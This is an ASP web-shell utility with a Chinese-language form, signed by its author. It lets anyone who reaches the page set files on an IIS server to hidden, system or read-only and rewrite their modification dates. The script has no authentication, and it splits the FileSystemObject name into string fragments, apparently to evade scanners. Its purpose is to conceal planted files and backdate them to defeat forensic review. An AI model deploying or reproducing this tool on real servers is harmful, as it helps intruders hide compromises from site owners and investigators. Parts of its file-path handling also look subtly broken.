<%
dim path,FileName,NewTime,ShuXing
set path=request.Form("path")
set filename=request.Form("filename")
set newTime=request.Form("newTime")
set ShuXing=request.Form("shuxing")
%>
<font color=red>
<form method=post>
路径：<input name='path' value='<%=server.MAppATH("/")%>\' size='40'> 记得一定要以\结尾<br>
名称：<input name=filename value='<%=filename%>' size='20'> 如果留空,就设置所有文件<br>
时间：<input name=newTime value='<%=newTime%>' size='20'>例如12/21/2012 23:59:59  不修改的话,请留空<br>
属性：<select onChange='this.form.shuxing.value=this.value;'>
<option value=''>普通 </option>
<option value='1'>只读</option>
<option value='2'>隐藏</option>
<option value='4'>系统</option>
<option value='34'>隐藏|存档</option>
<option value='33'>只读|存档</option>
<option value='35'>只读|隐藏|存档</option>
<option value='39'>只读|隐藏|存档|系统</option>
<input style="display:none" name=shuxing value='0' size='1'>
<input type=submit value=开始> by 蚊虫
</form>
<%
if path<>"" then
Set fso=Server.CreateObject("Scri"&"pting.FileSyste"&"mObject")
Set shell=Server.CreateObject("Shell.Application")
'===============我是文件的===============
if filename="" then '判断是修改全部 还是单个
Set objFolder=FSO.GetFolder(Path)
For Each objFile In objFolder.Files
fso.GetFile(objFile.Name).attributes=ShuXing
Next
Response.WRItE"修改 "&path&" 下的文件属性成功"
else
Set file=fso.getFile(path&fileName)
file.attributes=ShuXing
Response.WRItE"修改文件 "&path&fileName&" 属性完成 "
end if
'===============我是时间的===============
if newTime<>"" then '如果有数据就修改时间
Set app_path=shell.NameSpace(server.mappath("."))

if filename="" then '判断是修改全部 还是单个
Set objFolder=FSO.GetFolder(Path)

For Each objFile In objFolder.Files
Set app_file=app_path.ParseName(objFile.Name)
app_file.Modifydate=newTime
Next
Response.WRItE"<br>修改 "&path&" 下的文件的时间成功"
else
Set app_file=app_path.ParseName(fileName)
app_file.Modifydate=newTime
Response.WRItE"<br>修改文件 "&path&fileName&" 时间完成 "
end if

end if


end if
%>
</font>